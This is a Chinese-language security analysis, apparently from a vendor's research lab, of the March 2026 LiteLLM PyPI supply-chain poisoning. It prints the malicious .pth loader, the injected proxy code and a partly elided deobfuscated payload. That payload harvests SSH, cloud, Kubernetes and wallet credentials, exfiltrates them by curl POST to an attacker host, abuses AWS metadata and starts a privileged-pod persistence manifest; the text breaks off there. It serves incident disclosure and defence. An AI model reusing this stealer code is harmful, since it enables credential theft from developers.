---
title: LiteLLM供应链投毒攻击事件解析
url: https://mp.weixin.qq.com/s/7vxoSX3nifEmZUx2x8OmNA
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:38:03.356818
---

# LiteLLM供应链投毒攻击事件解析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/oCABd1XUc0jfkv4InpkOlZne4fUicS22Pc4PmMiaufp9AvRy0v6cZn1PPmlHvyxXOZjVzVNVx8QnkdnjibAvEChPDlYqORoRGx9rq7mHKjh7Wg/0?wx_fmt=jpeg)

# LiteLLM供应链投毒攻击事件解析

计算机与网络安全

![]()

在小说阅读器中沉浸阅读

近日，人工智能领域发生了一起震动全球开发者的安全事件。作为AI开发核心枢纽的LiteLLM网关遭遇供应链投毒攻击，大量使用者的密钥与敏感信息被窃取。这一事件被业界称为“**教科书级别的供应链攻击**”，其影响范围之广、危害程度之深，再次暴露出当前AI供应链体系的安全隐患。

LiteLLM作为AI网关，能够代理100多种大语言模型（LLM）的API，被广泛应用于AI编程与服务编排场景。目前其在GitHub上拥有超过4万Star，在PyPI的月下载量达9600万次。然而，正是这样一个备受信赖的基础设施组件，成为了攻击者的目标。

这一事件引发了业界高度关注。OpenAI创始人之一安德烈·卡帕西（Andrej Karpathy）发长推文警告所有开发者注意这一风险，甚至用”软件恐怖事件“来形容。他指出，现代软件项目往往依赖复杂的依赖链条，一旦其中任意环节被污染，风险将迅速传导至整个系统。攻击者通过不断窃取凭据，可以持续扩大攻击范围，实现级联放大效应。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPDfT5373GSPkWkch7ialK2Elr7ZZqht7RZ1TV6RZ02KgUpiaMkictjfUtDHTXGshNGpL9qNbUf3Sc8rpx8ibCRV490ibU6RdmISK2oo/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

特斯拉创始人埃隆·马斯克也在社交媒体上引用拉丁语"Caveat emptor"（买者自负），提醒大家注意承担风险。英伟达机器人部门总监及杰出科学家Jim Fan也表达了关切，强调AI基础设施安全的重要性。

![图片](https://mmbiz.qpic.cn/mmbiz_png/mSqhDgeKrPAqeZmPjrLf7icsUibluC59pNBAiaVEDadMN5Yzlr33OOzAoNpkFCg8HibboarPyWKfhGuj5pATKUWlJ8zqKAFcCQF95VDNAWnia7B8/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

奇安信技术研究院星图实验室第一时间发布《飞驰的AI列车下的隐患：Litellm AI供应链投毒事件分析》报告，依托“天问”软件供应链安全分析平台，尤其是天问供应链威胁监测模块，对Python、npm等主流的开发生态进行了长期、持续的监测，发现了大量的恶意包和攻击行为。

以下为分析报告全文

## 1. LiteLLM被投毒事件回顾

1.1 LiteLLM简介及攻击回顾

LiteLLM 作为 AI 网关，能够代理 100 多种大语言模型（LLM）的 API，被广泛应用于 AI 编程与服务编排场景。目前其在 GitHub 上拥有超过 4 万 Star，在 PyPI 的月下载量也超过 9600 万次。

2026 年 3 月 24 日，LiteLLM 在 PyPI 上遭遇供应链投毒攻击，1.82.7 与 1.82.8 两个版本被植入恶意代码。攻击代码会自动窃取受害者机器中的多类敏感凭据，包括 SSH 密钥、AWS/GCP/Azure 云服务凭据以及 Kubernetes Token 等。目前相关恶意版本已被官方移除。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPCcWao2phwaf0G5vUqEFAUZw3qNvEq7aUQgCjoQVVjwTQtPM6zBFz6nPd9ucw3LdUlicTCyR0icy9SUqmic7jF27ekmv6QBdreku8/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2)

1.2 恶意代码中的bug导致攻击露出马脚

此次投毒事件最早由 FutureSearch 发现并上报 PyPI，随后相关恶意版本被迅速下架，整体存活时间约为 5 小时。FutureSearch 在其博客中披露了事件细节[1]，而此次攻击的暴露，恰恰源于攻击者代码中的一个逻辑缺陷。

![图片](https://mmbiz.qpic.cn/mmbiz_png/mSqhDgeKrPC7BACe2ZV1rsFYRFicXVvcCJVPmgG1iaDK9iaicGcLY5SAzgopuD306XoE81eO2YB1nzz1KxdC4D3biaibQYavBMa75BNyC4AKoObYM/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3)

恶意代码被植入在.pth文件中。由于 Python 在启动时会自动执行.pth文件中的代码，攻击载荷在解释器启动阶段即被触发。该恶意代码通过启动子进程执行 payload，而子进程再次触发.pth执行，形成类似“分支炸弹”的效果，迅速耗尽系统资源，从而引起研究人员注意。

一次本可长期潜伏的供应链攻击，也因此被意外暴露并及时阻断。

litellm\_init.pth

import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN....'))"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

1.3 AI供应链安全的脆弱性

根据 Snyk 的分析报告[2]，此次攻击由 TeamPCP 组织发起。攻击者通过入侵 LiteLLM CI/CD 流程中使用的开源安全扫描工具 Trivy，获取了维护者的 PyPI 发布凭证，并利用该凭证发布了包含恶意载荷的 1.82.7 与 1.82.8 版本。

此次事件导致大量敏感凭据被窃取，受影响用户需要立即吊销并替换相关密钥，以避免后续风险扩散。

![图片](https://mmbiz.qpic.cn/mmbiz_png/mSqhDgeKrPD2Ph13ibkFNLDHCx15Epy9QibAhy1NrCsdb7Z7gbVh0IEDXFLXhVqYcyj97ISC5DQOVVWoNasAPNY3cicFY1KvbM5mz7ace7Uibxk/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4)

OpenAI的创始人之一Andrej Karpathy也对此次事件表达了担忧。他指出，现代软件项目往往依赖复杂的依赖链条，一旦其中任意环节被污染，风险将迅速传导至整个系统。攻击者通过不断窃取凭据，可以持续扩大攻击范围，实现级联放大效应。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPCmsNNJGAUFuLGVAk8bqiaaBgYmb0uY5vb7EYicJvuwdg1bz6kkbqs2CoITa6OjkXOEvvR8Aq45uLsWa4cJmFGgGqVY9uKDywbF8/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5)

例如，当前流行的 MCP 工具browser-use在 GitHub 上拥有超过 8 万 Star，其依赖链中包含litellm。在攻击窗口期内使用该工具，可能直接导致用户被攻击。此外，browser-use官方推荐使用uvx启动 MCP 服务，而uvx每次执行都会重新拉取依赖，这进一步放大了攻击影响。目前该项目已移除相关恶意依赖。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPD3ic8icZpYCrVFk9wyDG7WuicVO9pKMPicYDeWYv4oiauyvDvNzxCTdO6Nt4BX4tibtMt5kag2FIHzoPIl9sYrDQULkhApw9GLgqwH0/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6)

## 2. 攻击原理解析

2.1 攻击复现

pyproject.toml

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPCrSzjUxpSMLicjgLyuIhkfQ0gnRUIe1ZniaQlaaRQkOosicviaAict4k1pVpaoWXa3Baia4icZrgXxFkMH3PrQtUeNJAJySkViciaZsG2s/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7)

litellm-1.82.8 通过 .pth 文件加载恶意载荷，使攻击代码在 Python 启动时自动执行。我们复现了相关攻击流程如上。通过分析其pyproject.toml，我们发现litellm\_init.pth被显式打包，在用户安装后会被放置到site-packages目录中。

![图片](https://mmbiz.qpic.cn/mmbiz_png/mSqhDgeKrPAU0hIVMQAZicwFichmRM2qgXZJCenZvp95FwRLkXmfCgPic2byAvCToTzmqX8r6z8GDnQRqMkSpufdH84AJoCGqnj8OibXt1YcnMo/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8)

2.2 原理解析

通过分析 CPython 源码可以发现，Python 在启动时会自动加载site模块，该模块负责初始化运行环境并加载site-packages目录。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPAO75hncyEfN9gn3tePdPRBZ2YPoFCryibDOtfzezwCvqZhQvdoVNibjsumibFG7nHrrRzSaTDeH6OtIgldxnrXU1l3dxiaq1eRo7M/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9)

进一步分析site.py可知，其会扫描并执行site-packages目录下所有.pth文件中的import语句。因此，攻击者无需任何用户交互，即可在安装完成后自动触发恶意代码执行。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mSqhDgeKrPCZ7FxnyhGZBFG50WUeDYddmTy36LnnkHe90Aea7Z8kPT9n8rETXCNepD09MmoW6AerYSNGmMNEneVATOmQDtlJb5rAQO8l8GU/640?from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10)

## 3. 攻击代码解析

3.1 两种注入方式

两个恶意版本的注入方式存在差异：

1.82.7：在litellm/proxy/proxy\_server.py中注入代码

1.82.8：通过.pth文件在启动阶段执行

litellm/proxy/proxy\_server.py

...
import subprocess, base64, sys, tempfile, os

b64\_payload = "aW1wb3J0IHN1YnBy..."
with tempfile.TemporaryDirectory() as d:
    p = os.path.join(d, "p.py")
    with open(p, "wb") as f:
        f.write(base64.b64decode(b64\_payload))

    subprocess.run([sys.executable, p])
    ...

litellm/proxy/\_\_init\_\_.py

from . import \*

当proxy模块被导入时，恶意代码即被执行。

3.2 恶意代码解析

通过对litellm\_init.pth中的恶意代码进行反混淆，我们获得了如下代码。

Decoded Payload

import subprocess
import tempfile
import os
import base64
import sys

PUB\_KEY\_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICIj...AAQ==
-----END PUBLIC KEY-----"""

B64\_SCRIPT = "aW1wb3J0IG9zLH..."

def run():
    ...
try:
    subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
    subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
    subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa\_padding\_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
    subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

    subprocess.run([
        "curl", "-s", "-o", "/dev/null", "-w", "%{http\_code}", "-X", "POST",
        "https[:]//models.litellm.cloud/",
        "-H", "Content-Type: application/octet-stream",
        "-H", "X-Filename: tpcp.tar.gz",
        "--data-binary", f"@{bn}"
    ], check=True, stderr=subprocess.DEVNULL)
except Exception:
    pass

Decoded Payload (Continued)

import os,sys,stat,subprocess,glob
...
run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')
...
for h in homes+['/root']:
    for f in ['/.ssh/id\_rsa','/.ssh/id\_ed25519','/.ssh/id\_ecdsa','/.ssh/id\_dsa','/.ssh/authorized\_keys','/.ssh/known\_hosts','/.ssh/config']:
        emit(h+f)
    walk([h+'/.ssh'],2,lambda fp,fn:True)
...
emit('/var/lib/postgresql/.pgpass')
emit('/etc/mysql/my.cnf')
emit('/etc/redis/redis.conf')
...

具体攻击逻辑如下：

系统信息收集

run('hostname; pwd; whoami; uname -a; ip addr...')
run('printenv')

多维度凭据窃取

* SSH密钥:
* ~/.ssh/id\_rsa, id\_ed25519, authorized\_keys等
* 云服务凭据:
* AWS(~/.aws/credentials)、GCP(~/.config/gcloud)、Azure(~/.azure)
* Kubernetes:/var/run/secrets/kubernetes.io/serviceaccount/token, kubeconfig等
* 数据库:
* .pgpass, .my.cnf, Redis/Mongo配置
* Docker:~/.docker/config.json
* 加密货币钱包:

  Bitcoin、Ethereum、Solana等密钥文件

AWS凭据深度利用通过IMDSv2获取实例角色临时凭据，并调用Secrets Manager和SSM Parameter Store：

tkn\_req = urllib.request.Request('http[:]//169.254.169.254/latest/api/token', ...)
  cred\_req = urllib.request.Request('http[:]//169.254.169.254/latest/meta-data/iam/security-credentials/', ...)
  sm = aws\_req('POST', 'secretsmanager', REG, '/', 'Action=ListSecrets',...)

Kubernetes集群渗透利用ServiceAccount Token横向移动，枚举全集群Secrets，并在每个节点部署特权Pod实现持久化：

pod\_manifest = {
    'hostPID': True,
    'hostNetwork': True,
    'tolerations': [...